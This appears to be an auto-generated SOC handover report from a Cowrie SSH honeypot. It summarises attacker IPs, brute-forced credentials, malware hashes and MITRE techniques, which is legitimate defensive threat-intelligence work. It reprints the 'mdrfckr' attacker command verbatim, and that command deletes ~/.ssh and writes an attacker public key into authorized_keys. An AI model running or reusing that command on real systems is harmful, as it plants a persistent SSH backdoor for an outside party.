# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-24 |
| **Generated At** | 2026-03-24T16:58:47Z |
| **Shift Time** | 16:58 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **96** |
| Confirmed Threats | **83** |
| False Positives Filtered | **13** (13.5%) |
| Unique Attacker IPs | **37** |
| Countries of Origin | **17** |
| High Severity Cases | **3** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **93** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **39** |
| Unique Credential Pairs | **36** |
| Unique Usernames | **27** |
| Unique Passwords | **35** |
| Successful Auth Pairs | **3** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `centos` | 6 |
| `root` | 4 |
| `GET / HTTP/1.1` | 2 |
| `User-Agent: visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36` | 2 |
| `Accept-Encoding: gzip` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `Host: 13.235.92.17:23` | 2 |
| `Accept: */*` | 2 |
| `` | 2 |
| `123456` | 2 |
| `00000` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `GET / HTTP/1.1` | `Host: 13.235.92.17:23` | 2 |
| `User-Agent: visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36` | `Accept: */*` | 2 |
| `Accept-Encoding: gzip` | `` | 2 |
| `centos` | `00000` | 1 |
| `fastuser` | `fastuser1234` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `admin` | `120.85.117.204` | 2026-03-24T15:35:59 |
| `root` | `loki` | `188.132.197.124` | 2026-03-24T16:19:38 |
| `root` | `3245gs5662d34` | `188.132.197.124` | 2026-03-24T16:19:49 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1083, T1070, T1140` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
start
```
```
enable
```
```
config terminal
```
```
system
```
```
linuxshell
```
Source IPs: `120.85.117.204`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `188.132.197.124`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **37** |
| Unique ASNs | **33** |
| High-Risk ASNs | **23** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 3 | HIGH |
| `AS3462` | Data Communication Business Group | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS4766` | Korea Telecom | 1 | HIGH |
| `AS17816` | China Unicom IP network China169 Guangdong province | 1 | MEDIUM |
| `AS17552` | True Online | 1 | MEDIUM |
| `AS151185` | China Telecom | 1 | HIGH |
| `AS17622` | China Unicom Guangzhou network | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (2)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-d4237afadfea

| Field | Detail |
|---|---|
| **Source IP** | `188.132.197[.]124` |
| **First Seen** | 2026-03-24 16:19 |
| **Last Seen** | 2026-03-24 16:19 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-24 16:19:37` | `cowrie.session.connect` |
| `2026-03-24 16:19:37` | `cowrie.client.version` |
| `2026-03-24 16:19:37` | `cowrie.client.kex` |
| `2026-03-24 16:19:38` | `cowrie.login.success` |
| `2026-03-24 16:19:39` | `cowrie.session.params` |
| `2026-03-24 16:19:39` | `cowrie.command.input` |
| `2026-03-24 16:19:39` | `cowrie.command.failed` |
| `2026-03-24 16:19:39` | `cowrie.log.closed` |
| `2026-03-24 16:19:39` | `cowrie.session.params` |
| `2026-03-24 16:19:39` | `cowrie.command.input` |
| `2026-03-24 16:19:40` | `cowrie.session.file_download` |
| `2026-03-24 16:19:40` | `cowrie.log.closed` |
| `2026-03-24 16:19:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.132.197[.]124` to AbuseIPDB if not already reported
- [ ] Block `188.132.197[.]124` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-611fe1fa0bf8

| Field | Detail |
|---|---|
| **Source IP** | `188.132.197[.]124` |
| **First Seen** | 2026-03-24 16:19 |
| **Last Seen** | 2026-03-24 16:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-24 16:19:48` | `cowrie.session.connect` |
| `2026-03-24 16:19:48` | `cowrie.client.version` |
| `2026-03-24 16:19:48` | `cowrie.client.kex` |
| `2026-03-24 16:19:49` | `cowrie.login.success` |
| `2026-03-24 16:19:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.132.197[.]124` to AbuseIPDB if not already reported
- [ ] Block `188.132.197[.]124` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `61.184.12[.]143` | **17** | 2026-03-24 15:47 | 2026-03-24 15:50 | 8m | 0 | `T1592` | 🟠 MEDIUM |
| `188.132.197[.]124` | **15** | 2026-03-24 15:58 | 2026-03-24 16:50 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.126.26[.]93` | **10** | 2026-03-24 15:09 | 2026-03-24 15:19 | 16m | 1 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `115.190.27[.]28` | **9** | 2026-03-24 15:17 | 2026-03-24 15:26 | 13m | 0 | `T1592` | 🟢 LOW |
| `18.116.101[.]220` | **7** | 2026-03-24 14:56 | 2026-03-24 15:01 | 0m | 6 | `T1110.001` | 🟢 LOW |
| `103.215.244[.]24` | 1 | 2026-03-24 16:43 | 2026-03-24 16:43 | 15s | 0 | `T1592` | 🟢 LOW |
| `103.59.94[.]117` | 1 | 2026-03-24 15:08 | 2026-03-24 15:08 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `106.1.89[.]111` | 1 | 2026-03-24 16:45 | 2026-03-24 16:45 | 16s | 0 | `T1592` | 🟢 LOW |
| `113.210.21[.]5` | 1 | 2026-03-24 15:19 | 2026-03-24 15:19 | 13s | 0 | `T1592` | 🟢 LOW |
| `118.145.74[.]48` | 1 | 2026-03-24 15:08 | 2026-03-24 15:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.163.178[.]146` | 1 | 2026-03-24 15:41 | 2026-03-24 15:41 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.241.79[.]66` | 1 | 2026-03-24 16:27 | 2026-03-24 16:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.242.112[.]197` | 1 | 2026-03-24 15:14 | 2026-03-24 15:14 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.97.152[.]26` | 1 | 2026-03-24 14:55 | 2026-03-24 14:55 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `165.154.225[.]20` | 1 | 2026-03-24 15:30 | 2026-03-24 15:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `171.97.104[.]10` | 1 | 2026-03-24 15:02 | 2026-03-24 15:02 | 41s | 0 | `T1592` | 🟢 LOW |
| `180.76.98[.]88` | 1 | 2026-03-24 15:09 | 2026-03-24 15:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.94.74[.]82` | 1 | 2026-03-24 15:08 | 2026-03-24 15:08 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `187.8.17[.]38` | 1 | 2026-03-24 16:23 | 2026-03-24 16:23 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `200.114.67[.]55` | 1 | 2026-03-24 15:55 | 2026-03-24 15:56 | 31s | 0 | `T1592` | 🟢 LOW |
| `27.39.128[.]68` | 1 | 2026-03-24 16:11 | 2026-03-24 16:11 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `47.81.15[.]2` | 1 | 2026-03-24 15:15 | 2026-03-24 15:15 | 30s | 0 | `T1592` | 🟢 LOW |
| `48.210.66[.]163` | 1 | 2026-03-24 16:55 | 2026-03-24 16:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.149[.]213` | 1 | 2026-03-24 15:21 | 2026-03-24 15:22 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `59.22.68[.]213` | 1 | 2026-03-24 16:43 | 2026-03-24 16:43 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `84.5.129[.]68` | 1 | 2026-03-24 15:26 | 2026-03-24 15:26 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `87.236.176[.]175` | 1 | 2026-03-24 14:57 | 2026-03-24 14:57 | 2s | 0 | `T1592` | 🟢 LOW |
| `98.102.148[.]242` | 1 | 2026-03-24 16:05 | 2026-03-24 16:05 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `48.210.66[.]163` | JP | Microsoft Limited | **100** ⚠️ | 1 |
| `49.124.149[.]213` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 4 |
| `103.215.244[.]24` | IN | JDM Internet Solutions Private Limited | **100** ⚠️ | 5 |
| `14.97.152[.]26` | IN | TATA TELESERVICES LTD - TATA INDICOM - CDMA DIVISION | **100** ⚠️ | 1 |
| `180.76.98[.]88` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `59.22.68[.]213` | KR | Korea Telecom | **100** ⚠️ | 35 |
| `118.163.178[.]146` | TW | Chunghwa Telecom Co.,Ltd. | **100** ⚠️ | 50 |
| `98.102.148[.]242` | US | VERENA AT HILLIARD | **100** ⚠️ | 50 |
| `103.59.94[.]117` | ID | PT Lakuloka Digital Indonesia | **100** ⚠️ | 18 |
| `188.132.197[.]124` | TR | HOSTING DUNYAM BILISIM TEKNOLOJILERI TIC. LTD. STI. | **100** ⚠️ | 27 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 53 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 32 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 3 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 2 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 1 |

---

## 🔕 False Positive Summary (13 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 1 below threshold 25 | 1 |
| AbuseIPDB score 12 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 6 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 4 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 96 cases |
| Tool 34  | Credential Extractor        | ✅ 39 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 37 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 13 filtered (13.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 33 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 11 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 2 priority case(s) shown individually · 28 recon entry/entries in table (5 group(s) consolidating 58 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-24T16:58:47Z_
